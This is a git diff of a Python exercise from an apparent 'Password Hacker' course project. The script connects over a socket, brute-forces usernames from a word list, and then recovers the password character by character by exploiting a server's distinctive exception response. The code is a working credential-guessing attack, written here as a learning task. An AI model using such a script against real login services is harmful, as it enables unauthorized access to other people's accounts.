@@ -17,10 +17,6 @@ def args():
     return parser.parse_args()
 
 
-def generate_password():
-    pass
-
-
 def take_login():
     file_name = r'C:\Users\Тоша\PycharmProjects\Password Hacker\Password Hacker\task\logins.txt'
     with open(file_name, 'r', encoding='utf-8') as f:
@@ -31,11 +27,31 @@ def take_login():
             yield word
 
 
-def create_json(login, password=''):
-    '''take login or login+password. Return JSON. '''
+def create_json(login, password=' '):
+    """take login or login+password. Return JSON. """
     lp_dict = {}
     lp_dict.update({'login': login, 'password': password})
     return json.dumps(lp_dict)
+
+
+def send_request(client, request):
+    client.send(request.encode())  # converting to bytes, sending through socket
+    return client.recv(1024).decode()  # decoding from bytes to string
+
+
+def generate_password(client_, found_login, guess):
+    chars = list(ascii_letters + digits)
+    for character in chars:
+        password = guess + str(character)
+        data = create_json(found_login, password)
+        response = send_request(client_, data)
+        if response == json.dumps({"result": "Exception happened during login"}):
+            # print(response)
+            # print(password)
+            return password
+        elif response == json.dumps({"result": "Connection success!"}):
+            # print(response)
+            return ('found!', password)
 
 
 with socket.socket() as client_socket:
@@ -43,33 +59,32 @@ with socket.socket() as client_socket:
     hostname = arguments.IP
     port = int(arguments.port)
     address = (hostname, port)
-    try:
-        client_socket.connect(address)
-        # 1.Try all logins with an empty password.
-        for login in take_login():
-            # send the combination of login and password in JSON format
-            data = create_json(login)
-            request = data.encode()  # converting to bytes
-            client_socket.send(request)  # sending through socket
-            response = client_socket.recv(1024).decode()  # decoding from bytes to string
-            if response == json.dumps({"result": "Wrong password!"}):
-                # print('login found')
-                login_ = login
-                break
-        chars = list(ascii_letters + digits)
-        password_ = ''
-        while response != json.dumps({"result": "Connection success!"}):
-            for character in chars:
-                password = password_ + str(character)
-                data = create_json(login_, password)
-                request = data.encode()  # converting to bytes
-                client_socket.send(request)  # sending through socket
-                response = client_socket.recv(1024).decode()  # decoding from bytes to string
-                if response == json.dumps({"result": "Exception happened during login"}):
-                    password_ += str(character)
-                    break
-        print(create_json(login_, password_))
-
-    except ConnectionRefusedError as e:
-        print(e)
-
+    # print(address)
+    login_ = ''
+    
+    client_socket.connect(address)
+    # 1.Try all logins with an empty password.
+    for login in take_login():
+        # send the combination of login and password in JSON format
+        data = create_json(login)
+        response = send_request(client_socket, data)  # decoding from bytes to string
+        if response == json.dumps({"result": "Wrong password!"}):
+            # print('login found')
+            login_ = login
+            break
+    
+    password_ = ''
+    # print(password_)
+    for _ in range(100):
+    # while response != json.dumps({"result": "Connection success!"}):
+        password = generate_password(client_socket, login_, password_)
+        if password[0] == 'found!':
+            # print(password)
+            break
+        else:
+            data = create_json(login_, password)
+            response = send_request(client_socket, data)
+            password_ = password
+            
+    
+    print(create_json(login_, password[1]))
